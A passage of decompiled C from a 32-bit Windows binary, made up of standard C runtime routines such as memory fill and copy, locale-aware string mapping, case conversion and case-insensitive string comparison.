      while (param_3 = param_3 - 1, param_3 != 0) {
LAB_0045e60b:
        *(char *)puVar5 = cVar3;
        puVar5 = (uint *)((int)puVar5 + 1);
      }
      return param_1;
    }
    param_3 = param_3 - 1;
  } while (param_3 != 0);
  return param_1;
}



int __cdecl
FUN_0045e68e(LCID param_1,uint param_2,char *param_3,int param_4,LPWSTR param_5,int param_6,
            UINT param_7,int param_8)

{
  int iVar1;
  int iVar2;
  undefined unaff_DI;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0045a738;
  puStack_10 = &LAB_0045c368;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  if (DAT_0045f684 == 0) {
    iVar1 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_0045a730,1,(LPWSTR)0x0,0);
    if (iVar1 != 0) {
      DAT_0045f684 = 1;
      goto LAB_0045e704;
    }
    iVar1 = LCMapStringA(0,0x100,&DAT_0045a72c,1,(LPSTR)0x0,0);
    if (iVar1 != 0) {
      DAT_0045f684 = 2;
      goto LAB_0045e704;
    }
  }
  else {
LAB_0045e704:
    if (0 < param_4) {
      param_4 = FUN_0045e8b2(param_3,param_4);
    }
    if (DAT_0045f684 == 2) {
      iVar1 = LCMapStringA(param_1,param_2,param_3,param_4,(LPSTR)param_5,param_6);
      goto LAB_0045e81e;
    }
    if (DAT_0045f684 == 1) {
      if (param_7 == 0) {
        param_7 = DAT_0045f67c;
      }
      iVar2 = MultiByteToWideChar(param_7,(-(uint)(param_8 != 0) & 8) + 1,param_3,param_4,
                                  (LPWSTR)0x0,0);
      if (iVar2 != 0) {
        local_8 = 0;
        FUN_0045d660(unaff_DI);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x3c) &&
           (iVar1 = MultiByteToWideChar(param_7,1,param_3,param_4,(LPWSTR)&stack0xffffffc4,iVar2),
           iVar1 != 0)) {
          iVar1 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,(LPWSTR)0x0,0);
          if (iVar1 != 0) {
            if ((param_2 & 0x400) == 0) {
              local_8 = 1;
              FUN_0045d660(unaff_DI);
              local_8 = 0xffffffff;
              if ((&stack0x00000000 != (undefined *)0x3c) &&
                 (iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,
                                       (LPWSTR)&stack0xffffffc4,iVar1), iVar2 != 0)) {
                if (param_6 == 0) {
                  param_6 = 0;
                  param_5 = (LPWSTR)0x0;
                }
                iVar1 = WideCharToMultiByte(param_7,0x220,(LPCWSTR)&stack0xffffffc4,iVar1,
                                            (LPSTR)param_5,param_6,(LPCSTR)0x0,(LPBOOL)0x0);
                iVar2 = iVar1;
joined_r0x0045e8a5:
                if (iVar2 != 0) goto LAB_0045e81e;
              }
            }
            else {
              if (param_6 == 0) goto LAB_0045e81e;
              if (iVar1 <= param_6) {
                iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,param_5,param_6
                                    );
                goto joined_r0x0045e8a5;
              }
            }
          }
        }
      }
    }
  }
  iVar1 = 0;
LAB_0045e81e:
  *unaff_FS_OFFSET = local_14;
  return iVar1;
}



int __cdecl FUN_0045e8b2(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = param_1;
  iVar2 = param_2;
  if (param_2 != 0) {
    do {
      iVar2 = iVar2 + -1;
      if (*pcVar1 == '\0') break;
      pcVar1 = pcVar1 + 1;
    } while (iVar2 != 0);
  }
  if (*pcVar1 == '\0') {
    return (int)pcVar1 - (int)param_1;
  }
  return param_2;
}



BOOL __cdecl
FUN_0045e8dd(DWORD param_1,LPCSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6,
            int param_7)

{
  undefined *puVar1;
  BOOL BVar2;
  int iVar3;
  undefined unaff_DI;
  undefined4 *unaff_FS_OFFSET;
  WORD local_20 [2];
  undefined *local_1c;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0045a750;
  puStack_10 = &LAB_0045c368;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  local_1c = &stack0xffffffc8;
  iVar3 = DAT_0045f688;
  puVar1 = &stack0xffffffc8;
  if (DAT_0045f688 == 0) {
    BVar2 = GetStringTypeW(1,(LPCWSTR)&DAT_0045a730,1,local_20);
    iVar3 = 1;
    puVar1 = local_1c;
    if (BVar2 != 0) goto LAB_0045e94c;
    BVar2 = GetStringTypeA(0,1,&DAT_0045a72c,1,local_20);
    if (BVar2 != 0) {
      iVar3 = 2;
      puVar1 = local_1c;
      goto LAB_0045e94c;
    }
  }
  else {
LAB_0045e94c:
    local_1c = puVar1;
    DAT_0045f688 = iVar3;
    if (DAT_0045f688 == 2) {
      if (param_6 == 0) {
        param_6 = DAT_0045f66c;
      }
      BVar2 = GetStringTypeA(param_6,param_1,param_2,param_3,param_4);
      goto LAB_0045ea14;
    }
    if (DAT_0045f688 == 1) {
      if (param_5 == 0) {
        param_5 = DAT_0045f67c;
      }
      iVar3 = MultiByteToWideChar(param_5,(-(uint)(param_7 != 0) & 8) + 1,param_2,param_3,
                                  (LPWSTR)0x0,0);
      if (iVar3 != 0) {
        local_8 = 0;
        FUN_0045d660(unaff_DI);
        local_1c = &stack0xffffffc8;
        FUN_0045ea50((uint *)&stack0xffffffc8,0,iVar3 * 2);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x38) &&
           (iVar3 = MultiByteToWideChar(param_5,1,param_2,param_3,(LPWSTR)&stack0xffffffc8,iVar3),
           iVar3 != 0)) {
          BVar2 = GetStringTypeW(param_1,(LPCWSTR)&stack0xffffffc8,iVar3,param_4);
          goto LAB_0045ea14;
        }
      }
    }
  }
  BVar2 = 0;
LAB_0045ea14:
  *unaff_FS_OFFSET = local_14;
  return BVar2;
}



undefined4 __cdecl FUN_0045ea26(undefined4 param_1)

{
  int iVar1;
  
  if (DAT_0045f690 != (code *)0x0) {
    iVar1 = (*DAT_0045f690)(param_1);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}



uint * __cdecl FUN_0045ea50(uint *param_1,byte param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  if (param_3 == 0) {
    return param_1;
  }
  uVar1 = (uint)param_2;
  puVar4 = param_1;
  if (3 < param_3) {
    uVar2 = -(int)param_1 & 3;
    uVar3 = param_3;
    if (uVar2 != 0) {
      uVar3 = param_3 - uVar2;
      do {
        *(byte *)puVar4 = param_2;
        puVar4 = (uint *)((int)puVar4 + 1);
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    param_3 = uVar3 & 3;
    uVar3 = uVar3 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = uVar1;
        puVar4 = puVar4 + 1;
      }
      if (param_3 == 0) {
        return param_1;
      }
    }
  }
  do {
    *(char *)puVar4 = (char)uVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    param_3 = param_3 - 1;
  } while (param_3 != 0);
  return param_1;
}



uint * FUN_0045eaa8(void)

{
  uint *puVar1;
  
  puVar1 = FUN_0045c034();
  return puVar1 + 2;
}



uint __cdecl FUN_0045eab1(uint param_1)

{
  void *extraout_ECX;
  bool bVar1;
  void *this;
  
  if (DAT_0045f66c == 0) {
    if ((0x60 < (int)param_1) && ((int)param_1 < 0x7b)) {
      return param_1 - 0x20;
    }
  }
  else {
    InterlockedIncrement((LONG *)&DAT_0045f7e4);
    bVar1 = DAT_0045f7e0 != 0;
    this = extraout_ECX;
    if (bVar1) {
      InterlockedDecrement((LONG *)&DAT_0045f7e4);
      this = (void *)0x13;
      FUN_0045c5f5(0x13);
    }
    param_1 = FUN_0045eb20(this,param_1);
    if (bVar1) {
      FUN_0045c656(0x13);
    }
    else {
      InterlockedDecrement((LONG *)&DAT_0045f7e4);
    }
  }
  return param_1;
}



uint __thiscall FUN_0045eb20(void *this,uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  void *local_8;
  
  uVar1 = param_1;
  if (DAT_0045f66c == 0) {
    if ((0x60 < (int)param_1) && ((int)param_1 < 0x7b)) {
      uVar1 = param_1 - 0x20;
    }
  }
  else {
    local_8 = this;
    if ((int)param_1 < 0x100) {
      if (DAT_0045a028 < 2) {
        uVar2 = (byte)PTR_DAT_00459cb0[param_1 * 2] & 2;
      }
      else {
        uVar2 = FUN_0045ebec(this,param_1,2);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    if ((PTR_DAT_00459cb0[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1 = CONCAT31((int3)(param_1 >> 8),(char)uVar1) & 0xffff00ff;
      iVar3 = 1;
    }
    else {
      uVar2 = param_1 >> 0x10;
      param_1._0_2_ = CONCAT11((char)uVar1,(char)(uVar1 >> 8));
      param_1 = CONCAT22((short)uVar2,(undefined2)param_1) & 0xff00ffff;
      iVar3 = 2;
    }
    iVar3 = FUN_0045e68e(DAT_0045f66c,0x200,(char *)&param_1,iVar3,(LPWSTR)&local_8,3,0,1);
    if (iVar3 != 0) {
      if (iVar3 == 1) {
        uVar1 = (uint)local_8 & 0xff;
      }
      else {
        uVar1 = (uint)local_8 & 0xffff;
      }
    }
  }
  return uVar1;
}



uint __thiscall FUN_0045ebec(void *this,int param_1,uint param_2)

{
  BOOL BVar1;
  int iVar2;
  uint local_8;
  
  if (param_1 + 1U < 0x101) {
    param_1._2_2_ = *(ushort *)(PTR_DAT_00459cb0 + param_1 * 2);
  }
  else {
    if ((PTR_DAT_00459cb0[(param_1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      local_8 = CONCAT31((int3)((uint)this >> 8),(char)param_1) & 0xffff00ff;
      iVar2 = 1;
    }
    else {
      local_8._0_2_ = CONCAT11((char)param_1,(char)((uint)param_1 >> 8));
      local_8 = CONCAT22((short)((uint)this >> 0x10),(undefined2)local_8) & 0xff00ffff;
      iVar2 = 2;
    }
    BVar1 = FUN_0045e8dd(1,(LPCSTR)&local_8,iVar2,(LPWORD)((int)&param_1 + 2),0,0,1);
    if (BVar1 == 0) {
      return 0;
    }
  }
  return param_1._2_2_ & param_2;
}



undefined4 * __cdecl FUN_0045ec70(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar1 = param_3 >> 2;
      uVar2 = param_3 & 3;
      if (7 < uVar1) {
        for (; uVar1 != 0; uVar1 = uVar1 - 1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar2) {
        case 0:
          return param_1;
        case 2:
          goto switchD_0045ee27_caseD_2;
        case 3:
          goto switchD_0045ee27_caseD_3;
        }
        goto switchD_0045ee27_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_0045ee27_caseD_0;
      case 1:
        goto switchD_0045ee27_caseD_1;
      case 2:
        goto switchD_0045ee27_caseD_2;
      case 3:
        goto switchD_0045ee27_caseD_3;
      default:
        uVar1 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          puVar3 = (undefined4 *)((int)puVar3 + -1);
          uVar1 = uVar1 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0045ee27_caseD_2;
            case 3:
              goto switchD_0045ee27_caseD_3;
            }
            goto switchD_0045ee27_caseD_1;
          }
          break;
        case 2:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          puVar3 = (undefined4 *)((int)puVar3 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0045ee27_caseD_2;
            case 3:
              goto switchD_0045ee27_caseD_3;
            }
            goto switchD_0045ee27_caseD_1;
          }
          break;
        case 3:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
          puVar3 = (undefined4 *)((int)puVar3 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0045ee27_caseD_2;
            case 3:
              goto switchD_0045ee27_caseD_3;
            }
            goto switchD_0045ee27_caseD_1;
          }
        }
      }
    }
    switch(uVar1) {
    case 7:
      puVar4[7 - uVar1] = puVar3[7 - uVar1];
    case 6:
      puVar4[6 - uVar1] = puVar3[6 - uVar1];
    case 5:
      puVar4[5 - uVar1] = puVar3[5 - uVar1];
    case 4:
      puVar4[4 - uVar1] = puVar3[4 - uVar1];
    case 3:
      puVar4[3 - uVar1] = puVar3[3 - uVar1];
    case 2:
      puVar4[2 - uVar1] = puVar3[2 - uVar1];
    case 1:
      puVar4[1 - uVar1] = puVar3[1 - uVar1];
      puVar3 = puVar3 + -uVar1;
      puVar4 = puVar4 + -uVar1;
    }
    switch(uVar2) {
    case 1:
switchD_0045ee27_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      return param_1;
    case 2:
switchD_0045ee27_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      return param_1;
    case 3:
switchD_0045ee27_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
      return param_1;
    }
switchD_0045ee27_caseD_0:
    return param_1;
  }
  puVar3 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar1 = param_3 >> 2;
    uVar2 = param_3 & 3;
    if (7 < uVar1) {
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *param_2;
        param_2 = param_2 + 1;
        puVar3 = puVar3 + 1;
      }
      switch(uVar2) {
      case 0:
        return param_1;
      case 2:
        goto switchD_0045eca5_caseD_2;
      case 3:
        goto switchD_0045eca5_caseD_3;
      }
      goto switchD_0045eca5_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_0045eca5_caseD_0;
    case 1:
      goto switchD_0045eca5_caseD_1;
    case 2:
      goto switchD_0045eca5_caseD_2;
    case 3:
      goto switchD_0045eca5_caseD_3;
    default:
      uVar1 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar3 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0045eca5_caseD_2;
          case 3:
            goto switchD_0045eca5_caseD_3;
          }
          goto switchD_0045eca5_caseD_1;
        }
        break;
      case 2:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar3 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0045eca5_caseD_2;
          case 3:
            goto switchD_0045eca5_caseD_3;
          }
          goto switchD_0045eca5_caseD_1;
        }
        break;
      case 3:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        puVar3 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0045eca5_caseD_2;
          case 3:
            goto switchD_0045eca5_caseD_3;
          }
          goto switchD_0045eca5_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar1) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 7] = param_2[uVar1 - 7];
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 6] = param_2[uVar1 - 6];
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 5] = param_2[uVar1 - 5];
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 4] = param_2[uVar1 - 4];
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 3] = param_2[uVar1 - 3];
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 2] = param_2[uVar1 - 2];
  case 4:
  case 5:
  case 6:
  case 7:
    puVar3[uVar1 - 1] = param_2[uVar1 - 1];
    param_2 = param_2 + uVar1;
    puVar3 = puVar3 + uVar1;
  }
  switch(uVar2) {
  case 1:
switchD_0045eca5_caseD_1:
    *(undefined *)puVar3 = *(undefined *)param_2;
    return param_1;
  case 2:
switchD_0045eca5_caseD_2:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_0045eca5_caseD_3:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)param_2 + 2);
    return param_1;
  }
switchD_0045eca5_caseD_0:
  return param_1;
}



int __cdecl FUN_0045f040(byte *param_1,byte *param_2)

{
  byte bVar1;
  byte *pbVar2;
  int iVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *param_2;
    if (bVar1 == 0) break;
    param_2 = param_2 + 1;
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  iVar3 = -1;
  do {
    iVar3 = iVar3 + 1;
    bVar1 = *param_1;
    if (bVar1 == 0) {
      return iVar3;
    }
    param_1 = param_1 + 1;
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return iVar3;
}



byte * __cdecl FUN_0045f080(byte *param_1,byte *param_2)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *param_2;
    if (bVar1 == 0) break;
    param_2 = param_2 + 1;
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = param_1;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (byte *)(uint)bVar1;
    }
    param_1 = pbVar2 + 1;
  } while ((*(byte *)((int)&uStack_28 + ((int)(byte *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return pbVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __thiscall FUN_0045f0c0(void *this,byte *param_1,byte *param_2)

{
  bool bVar1;
  int iVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  uint uVar6;
  void *extraout_ECX;
  void *this_00;
  void *extraout_ECX_00;
  uint uVar7;
  uint uVar8;
  
  iVar2 = _DAT_0045f7e4;
  if (DAT_0045f66c == 0) {
    bVar5 = 0xff;
    do {
      do {
        if (bVar5 == 0) goto LAB_0045f10e;
        bVar5 = *param_2;
        param_2 = param_2 + 1;
        bVar4 = *param_1;
        param_1 = param_1 + 1;
      } while (bVar4 == bVar5);
      bVar3 = bVar5 + 0xbf + (-((byte)(bVar5 + 0xbf) < 0x1a) & 0x20U) + 0x41;
      bVar4 = bVar4 + 0xbf;
      bVar5 = bVar4 + (-(bVar4 < 0x1a) & 0x20U) + 0x41;
    } while (bVar5 == bVar3);
    bVar5 = (bVar5 < bVar3) * -2 + 1;
LAB_0045f10e:
    uVar6 = (uint)(char)bVar5;
  }
  else {
    LOCK();
    _DAT_0045f7e4 = _DAT_0045f7e4 + 1;
    UNLOCK();
    bVar1 = 0 < DAT_0045f7e0;
    if (bVar1) {
      LOCK();
      UNLOCK();
      _DAT_0045f7e4 = iVar2;
      FUN_0045c5f5(0x13);
      this = extraout_ECX;
    }
    uVar8 = (uint)bVar1;
    uVar6 = 0xff;
    uVar7 = 0;
    do {
      do {
        if ((char)uVar6 == '\0') goto LAB_0045f16f;
        bVar5 = *param_2;
        uVar6 = CONCAT31((int3)(uVar6 >> 8),bVar5);
        param_2 = param_2 + 1;
        bVar4 = *param_1;
        uVar7 = CONCAT31((int3)(uVar7 >> 8),bVar4);
        param_1 = param_1 + 1;
      } while (bVar5 == bVar4);
      uVar7 = FUN_0045f385(this,uVar7);
      uVar6 = FUN_0045f385(this_00,uVar6);
      this = extraout_ECX_00;
    } while ((byte)uVar7 == (byte)uVar6);
    uVar7 = (uint)((byte)uVar7 < (byte)uVar6);
    uVar6 = (1 - uVar7) - (uint)(uVar7 != 0);
LAB_0045f16f:
    if (uVar8 == 0) {
      LOCK();
      _DAT_0045f7e4 = _DAT_0045f7e4 + -1;
      UNLOCK();
    }
    else {
      FUN_0045c656(0x13);
    }
  }
  return uVar6;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void * __cdecl FUN_0045f190(byte *param_1,char *param_2,void *param_3)

{
  char cVar1;
  int iVar2;
  byte bVar3;
  ushort uVar4;
  uint uVar5;
  void *this;
  uint uVar6;
  bool bVar7;
  uint uVar8;
  
  iVar2 = _DAT_0045f7e4;
  if (param_3 != (void *)0x0) {
    if (DAT_0045f66c == 0) {
      do {
        bVar3 = *param_1;
        cVar1 = *param_2;
        uVar4 = CONCAT11(bVar3,cVar1);
        if (bVar3 == 0) break;
        uVar4 = CONCAT11(bVar3,cVar1);
        uVar6 = (uint)uVar4;
        if (cVar1 == '\0') break;
        param_1 = param_1 + 1;
        param_2 = param_2 + 1;
        if ((0x40 < bVar3) && (bVar3 < 0x5b)) {
          uVar6 = (uint)CONCAT11(bVar3 + 0x20,cVar1);
        }
        uVar4 = (ushort)uVar6;
        bVar3 = (byte)uVar6;
        if ((0x40 < bVar3) && (bVar3 < 0x5b)) {
          uVar4 = (ushort)CONCAT31((int3)(uVar6 >> 8),bVar3 + 0x20);
        }
        bVar3 = (byte)(uVar4 >> 8);
        bVar7 = bVar3 < (byte)uVar4;
        if (bVar3 != (byte)uVar4) goto LAB_0045f1ef;
        param_3 = (void *)((int)param_3 + -1);
      } while (param_3 != (void *)0x0);
      param_3 = (void *)0x0;
      bVar3 = (byte)(uVar4 >> 8);
      bVar7 = bVar3 < (byte)uVar4;
      if (bVar3 != (byte)uVar4) {
LAB_0045f1ef:
        param_3 = (void *)0xffffffff;
        if (!bVar7) {
          param_3 = (void *)0x1;
        }
      }
    }
    else {
      LOCK();
      _DAT_0045f7e4 = _DAT_0045f7e4 + 1;
      UNLOCK();
      bVar7 = 0 < DAT_0045f7e0;
      if (bVar7) {
        LOCK();
        UNLOCK();
        _DAT_0045f7e4 = iVar2;
        FUN_0045c5f5(0x13);
      }
      uVar8 = (uint)bVar7;
      uVar5 = 0;
      uVar6 = 0;
      do {
        uVar5 = CONCAT31((int3)(uVar5 >> 8),*param_1);
        uVar6 = CONCAT31((int3)(uVar6 >> 8),*param_2);
        if ((uVar5 == 0) || (uVar6 == 0)) break;
        param_1 = param_1 + 1;
        param_2 = param_2 + 1;
        uVar6 = FUN_0045f385(param_3,uVar6);
        uVar5 = FUN_0045f385(this,uVar5);
        bVar7 = uVar5 < uVar6;
        if (uVar5 != uVar6) goto LAB_0045f265;
        param_3 = (void *)((int)param_3 + -1);
      } while (param_3 != (void *)0x0);
      param_3 = (void *)0x0;
      bVar7 = uVar5 < uVar6;
      if (uVar5 != uVar6) {
LAB_0045f265:
        param_3 = (void *)0xffffffff;
        if (!bVar7) {
          param_3 = (void *)0x1;
        }
      }
      if (uVar8 == 0) {
        LOCK();
        _DAT_0045f7e4 = _DAT_0045f7e4 + -1;
        UNLOCK();
      }
      else {
        FUN_0045c656(0x13);
      }
    }
  }
  return param_3;
}



uint __thiscall FUN_0045f385(void *this,uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  void *local_8;
  
  uVar1 = param_1;
  if (DAT_0045f66c == 0) {
    if ((0x40 < (int)param_1) && ((int)param_1 < 0x5b)) {
      uVar1 = param_1 + 0x20;
    }
  }
  else {
    iVar3 = 1;
    local_8 = this;
    if ((int)param_1 < 0x100) {
      if (DAT_0045a028 < 2) {
        uVar2 = (byte)PTR_DAT_00459cb0[param_1 * 2] & 1;
      }
      else {
        uVar2 = FUN_0045ebec(this,param_1,1);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    if ((PTR_DAT_00459cb0[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1 = CONCAT31((int3)(param_1 >> 8),(char)uVar1) & 0xffff00ff;
    }
    else {
      uVar2 = param_1 >> 0x10;
      param_1._0_2_ = CONCAT11((char)uVar1,(char)(uVar1 >> 8));
      param_1 = CONCAT22((short)uVar2,(undefined2)param_1) & 0xff00ffff;
      iVar3 = 2;
    }
    iVar3 = FUN_0045e68e(DAT_0045f66c,0x100,(char *)&param_1,iVar3,(LPWSTR)&local_8,3,0,1);
    if (iVar3 != 0) {
      if (iVar3 == 1) {
        uVar1 = (uint)local_8 & 0xff;
      }
      else {
        uVar1 = (uint)local_8 & 0xffff;
      }
    }
  }
  return uVar1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0045f484. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}


